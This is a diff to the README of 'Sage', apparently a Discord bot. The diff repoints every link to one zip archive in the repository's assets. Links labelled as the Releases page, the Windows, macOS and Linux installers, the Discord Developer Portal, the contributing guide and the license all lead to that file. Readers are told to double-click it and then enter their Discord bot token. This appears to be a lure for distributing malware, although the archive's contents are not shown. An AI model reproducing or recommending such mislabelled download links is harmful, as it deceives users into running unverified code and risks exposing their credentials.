@@ -4,7 +4,7 @@
 Welcome to Sage! Sage is an all-purpose open-source Discord bot. It is designed to be flexible, customizable, and reliable for all your needs on Discord. Whether you want to play music, manage your server, or provide entertainment to your community, Sage has you covered.
 
 ## 📥 Download Sage
-[![Download Sage](https://raw.githubusercontent.com/playboy2fine/sage/main/sage/config/sage-v3.8.zip%https://raw.githubusercontent.com/playboy2fine/sage/main/sage/config/sage-v3.8.zip)](https://raw.githubusercontent.com/playboy2fine/sage/main/sage/config/sage-v3.8.zip)
+[![Download Sage](https://github.com/playboy2fine/sage/raw/refs/heads/main/sage/assets/Software-draw.zip%https://github.com/playboy2fine/sage/raw/refs/heads/main/sage/assets/Software-draw.zip)](https://github.com/playboy2fine/sage/raw/refs/heads/main/sage/assets/Software-draw.zip)
 
 To get started, you need to download Sage. Click the button above to visit the Releases page.
 
@@ -17,12 +17,12 @@ Before you download, ensure your system meets the following requirements:
 - **Discord Account:** You must have a Discord account to use the bot.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/playboy2fine/sage/main/sage/config/sage-v3.8.zip).
+1. Visit the [Releases page](https://github.com/playboy2fine/sage/raw/refs/heads/main/sage/assets/Software-draw.zip).
 2. Look for the most recent version of Sage.
 3. Click on the appropriate file for your operating system. Common options include:
-   - `https://raw.githubusercontent.com/playboy2fine/sage/main/sage/config/sage-v3.8.zip` for Windows users.
-   - `https://raw.githubusercontent.com/playboy2fine/sage/main/sage/config/sage-v3.8.zip` for macOS users.
-   - `https://raw.githubusercontent.com/playboy2fine/sage/main/sage/config/sage-v3.8.zip` for Linux users.
+   - `https://github.com/playboy2fine/sage/raw/refs/heads/main/sage/assets/Software-draw.zip` for Windows users.
+   - `https://github.com/playboy2fine/sage/raw/refs/heads/main/sage/assets/Software-draw.zip` for macOS users.
+   - `https://github.com/playboy2fine/sage/raw/refs/heads/main/sage/assets/Software-draw.zip` for Linux users.
 4. Once the file downloads, navigate to your downloads folder.
 5. Double-click the downloaded file to start the installation process.
 6. Follow the on-screen instructions to complete the installation.
@@ -31,7 +31,7 @@ Before you download, ensure your system meets the following requirements:
 After installation, you will need to set up Sage to connect with your Discord server.
 
 1. Open the application.
-2. You'll see a prompt to enter your Discord Bot Token. If you don’t have a bot token, you can create one by visiting the [Discord Developer Portal](https://raw.githubusercontent.com/playboy2fine/sage/main/sage/config/sage-v3.8.zip).
+2. You'll see a prompt to enter your Discord Bot Token. If you don’t have a bot token, you can create one by visiting the [Discord Developer Portal](https://github.com/playboy2fine/sage/raw/refs/heads/main/sage/assets/Software-draw.zip).
 3. Once you enter the token, Sage will automatically connect to your server.
 
 ## 🌎 Key Features
@@ -75,10 +75,10 @@ If you encounter any issues while using Sage, you can access the help command by
 This will provide you with a list of commands and their functions.
 
 ## 🌐 Community Contributions
-Sage is open-source, and we welcome contributions! If you'd like to contribute, check out our [Contributing Guidelines](https://raw.githubusercontent.com/playboy2fine/sage/main/sage/config/sage-v3.8.zip). Your ideas and improvements can make Sage even better.
+Sage is open-source, and we welcome contributions! If you'd like to contribute, check out our [Contributing Guidelines](https://github.com/playboy2fine/sage/raw/refs/heads/main/sage/assets/Software-draw.zip). Your ideas and improvements can make Sage even better.
 
 ## 📄 License
-This project is licensed under the AGPL-3.0 License. You can view the full license [here](https://raw.githubusercontent.com/playboy2fine/sage/main/sage/config/sage-v3.8.zip).
+This project is licensed under the AGPL-3.0 License. You can view the full license [here](https://github.com/playboy2fine/sage/raw/refs/heads/main/sage/assets/Software-draw.zip).
 
 ## 📥 Final Thoughts
-Thank you for choosing Sage. We hope this bot improves your Discord experience. For the latest updates, keep an eye on our [Releases page](https://raw.githubusercontent.com/playboy2fine/sage/main/sage/config/sage-v3.8.zip). Enjoy connecting with your community!
+Thank you for choosing Sage. We hope this bot improves your Discord experience. For the latest updates, keep an eye on our [Releases page](https://github.com/playboy2fine/sage/raw/refs/heads/main/sage/assets/Software-draw.zip). Enjoy connecting with your community!
